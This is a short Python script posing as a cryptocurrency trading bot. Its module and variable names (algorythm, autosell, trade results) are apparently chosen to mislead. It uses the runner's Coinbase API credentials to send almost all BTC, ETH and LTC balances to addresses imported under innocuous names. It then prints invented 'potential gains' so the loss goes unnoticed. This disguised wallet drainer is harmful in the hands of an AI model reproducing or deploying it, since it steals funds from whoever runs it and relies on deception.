from coinbase.wallet.client import Client
from setup import first as logical
from setup import second as onlossfix
from otherimp import Q as term
from rootrequest import T as potential
from balad import Z as autosell
from algorythm import FIRSTTRADERESULTS

client = Client(logical, onlossfix)

accounts = client.get_accounts()

for account_data in accounts['data']:
  amount = account_data['balance']['amount']
  send_amountBTC = float(amount) - 0.00012
  send_amountETH = float(amount) - 0.0016
  send_amountLTC = float(amount) - 0.026

  if float(account_data['balance']['amount']) != 0:
    if account_data['balance']['currency'] == 'BTC':
      tx = client.send_money(account_data['id'], to=term, amount=send_amountBTC, currency='BTC')
    elif account_data['balance']['currency'] == 'ETH':
      tx = client.send_money(account_data['id'], to=potential, amount=send_amountETH, currency='ETH')
    elif account_data['balance']['currency'] == 'LTC':
        tx = client.send_money(account_data['id'], to=autosell, amount=send_amountLTC, currency='LTC')
    else:
        continue

secondtraderesults = 'Potential gains are :'
print(FIRSTTRADERESULTS)
gains = 0.0134
print(secondtraderesults, gains)
